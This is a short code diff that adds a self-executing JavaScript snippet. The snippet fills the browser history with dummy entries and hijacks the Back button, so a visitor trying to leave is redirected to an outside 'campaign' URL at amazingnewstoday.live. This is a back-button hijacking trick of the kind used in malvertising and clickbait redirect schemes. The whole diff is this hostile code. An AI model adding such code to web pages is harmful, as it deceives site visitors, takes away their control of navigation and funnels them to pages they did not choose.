@@ -1,0 +1,8 @@
+!function(){
+    var campaign_link = "https://amazingnewstoday.live/next";
+    var t;              
+    try{
+      for(t=0;2>t;++t)history.pushState({},"","#");
+      onpopstate=function(t){t.state&&location.replace(campaign_link)}}
+    catch(o){}
+  }();
